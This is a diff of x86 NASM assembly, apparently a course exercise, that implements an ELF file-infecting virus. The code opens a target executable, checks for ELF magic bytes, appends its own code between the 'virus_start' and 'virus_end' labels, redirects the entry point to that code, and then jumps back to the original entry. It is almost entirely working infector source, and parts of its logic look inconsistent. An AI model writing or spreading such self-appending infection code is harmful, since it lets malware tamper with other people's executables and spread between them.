@@ -50,16 +50,14 @@
 %define	PHDR_vaddr	8
 %define ELFHDR_size    52
 %define ELFHDR_phoff	28
-
-%define flags 24
+%define	vaddr_off	60
 
 %define STDOUT		1
 %define FD dword [ebp-4]
-%define elf_hdr ebp-56                          ; -4 - headrSize
-%define fsize dword [ebp-60]                    ; addres before headr
-%define initalEntry dword ebp-64
-%define pheader_offset dword [ebp-70]
-%define pheader ebp-102
+%define elf_hdr ebp-56                            ; -4 - headrSize
+%define fsize dword [ebp-60]                      ; addres before headr
+%define initalEntry ebp-64
+
 
 
     global _start
@@ -68,101 +66,63 @@
 _start:
     push ebp
     mov	ebp, esp
-    sub	esp, STK_RES                            ; Set up ebp and reserve space on the stack for local storage
+    sub	esp, STK_RES                              ; Set up ebp and reserve space on the stack for local storage
+    
+    write STDOUT, OutStr, 32                      ;
+
+    ;read_file:                                   ; symbol name
+    call get_my_loc_b                             ; get relative string address
+    add ebx, FileName                             ; push filename to ebx
+    open ebx, RDWR, 0777                          ; open in read/write mode
+    mov FD, eax                                   ; save fs of opend file
+    cmp FD, -1                                    ; if couldnt open file
+    je err                                        ; display error msg and exit
+
+    ; is elf
+    read FD, ebp, 4
+    mov ecx, ebp
+    cmp dword[ecx], 0x464C457F                   ; it is elf if the first bytes match 7f 45 4c ( E L F )
+                                                 
+    ; get original entry point
+    lseek FD, ENTRY, SEEK_SET                     ; store the original entry pint in org_entry
+    read FD, org_entry, 4                          
+
+    ; infect file
+    lseek FD, 0, SEEK_END                         ; point to the end of the file
+    mov esi, eax                                  ; esi = file size
+    write FD, virus_start, virus_end-virus_start  ; append this script to a file
+                                    
+    ; get virtual addres
+    lseek FD, vaddr_off, SEEK_SET                 ; point to virtual address in program header
+    read FD, ebp, 4                               ; offset = 52+8
+    add esi, dword[ecx]                           ; filesize + virtual address
+    mov dword[mod_entry], esi                     ; store it in modified entry point  
+
+    ; update entry point
+    lseek FD, ENTRY, SEEK_SET                     ; point to the entry point                      
+    write FD, mod_entry, 4                        ; write the modified one insted
+
+    ; set previous
+    lseek FD, -4, SEEK_END                        ; after executing the virus, go to the
+    write FD, org_entry, 4                        ; original entry and execute the real file
+    jmp VirusExit                                 ; only then return
 
 
-    .print_msg:                                 ; else, it is an elf file, print  outStr
-    call get_my_loc                             ; ??
-    add  ecx, OutStr                            ; put the string in ecx
-    write STDOUT, ecx, 32                       ; print the string to STDOUT
 
-    .read_file:                                 ; symbol name
-    call get_my_loc_b                           ; ??
-    add ebx, FileName                           ; push filename to ebx
-    open ebx,RDWR, 0x777                        ; open in read/write mode
-    mov FD, eax                                 ; save fs of opend file
-    cmp FD, -1                                  ; if couldnt open file
-    je err                                      ; display error msg and exit
+virus_start:
+    .print_msg:                                   
+    call get_my_loc                               ; get relative string address
+    add  ecx, OutStr                              ; put the string in ecx
+    write STDOUT, ecx, 32                         ; print the string to STDOUT
 
-    .get_headr:                                 ; symbol name
-    lea ecx, [elf_hdr]                          ; we use lea to load into struct
-    read FD, ecx, ELFHDR_size                   ; read the header of ELF
-
-    .is_elf:                                    ; symbol name
-    cmp dword [elf_hdr], 0x464C457F             ; it is elf if the first bytes match 7f 45 4c in little endian
-    jne err                                     ; bytes dont match, print the FailStr
-                                                ; it is an elf
-
-    .infect_file:
-    lseek FD, 0, SEEK_END                       ; point to the end of the file
-    mov fsize, eax                              ; store file size
-    call get_my_loc
-    add ecx, _start                             ; point to start of this file
-    mov edx , virus_end - _start                ; script content
-    write FD, ecx, edx                          ; append this script to a file
-
-    .save_entry:
-    lseek FD, 0, SEEK_SET                       ; set the file pointer to the end of the file
-    mov eax, dword [elf_hdr + ENTRY]
-    mov dword [initalEntry], eax
-
-    .update_header:
-    mov eax, 0x8048080                          ; base addres
-    add eax, fsize
-    lseek FD, 0, SEEK_SET                       ; point to the end of the file
-
-    lea ecx, [elf_hdr]                          ; save offset
-    write FD, ecx, ELFHDR_size                  ; write the modified header
-
-    .set_new_return:
-    lseek FD, -4, SEEK_END                      ; modifing the last 4 bytes which hold the return address
-    lea ecx, [initalEntry]
-    write FD, ecx, 4
-    lseek FD, 0, SEEK_SET
-
-    .copy_program_hdr:
-    mov eax, dword [elf_hdr + PHDR_start]      ; offset of the program header
-    add eax, PHDR_size                          ; point to the second program heade entry
-    mov pheader_offset, eax              ; offest of the second program header entry
-    lseek FD, pheader_offset, SEEK_SET
-    lea ecx, [pheader]
-    read FD, ecx, PHDR_size                       ; read 32 first byte (header size of ELF)
-    lseek FD, 0 ,SEEK_SET                       ; set the file pointer to the end of the file
-    and eax, 0 ;???????????
-    mov eax, dword [pheader + PHDR_vaddr]  ; eax=phdr_vaddr
-    sub eax, dword [pheader + PHDR_offset] ; eax=phdr_vaddr-offset
-
-    .modify_entry_point:
-    add eax, fsize
-    mov dword [elf_hdr + ENTRY], eax
-    lea ecx, [elf_hdr]
-    write FD, ecx, 52                             ; write the modified header back to the file
-
-    lseek FD, 0, SEEK_END                        ; size of the file
-    mov ebx, virus_end - _start                   ; size of the virus
-    mov ecx, dword [pheader + PHDR_offset]
-
-    add eax, ebx
-    add eax, ecx
-    mov dword [pheader + PHDR_filesize], eax
-    mov dword [pheader + PHDR_memsize], eax
-    add dword [pheader + flags], 0x1  ; add executable flag
-    lseek FD, pheader_offset, SEEK_SET
-    lea ecx, [pheader]
-    write FD,ecx,PHDR_size
-
-    close FD
-
-    .goto_retrun:
-    call get_my_loc_b
-    add ebx, PreviousEntryPoint
-    mov eax, [ebx]
-    jmp eax
-
+    call get_my_loc                               ;
+    add ecx, PreviousEntryPoint                   
+    jmp [ecx]                                     ; execute the original code
 
 VirusExit:
-    exit 0                                      ; Termination if all is OK and no previous code to jump to
-                                                ; (also an example for use of above macros)
+    close FD
+    exit 0                                        ; Termination if all is OK and no previous code to jump to
+                                                  ; (also an example for use of above macros)
 
 err:
     call get_my_loc
@@ -194,3 +154,7 @@ get_my_loc_b:
 
 PreviousEntryPoint: dd VirusExit
 virus_end:
+
+section .bss
+org_entry: resd 1
+mod_entry: resd 1
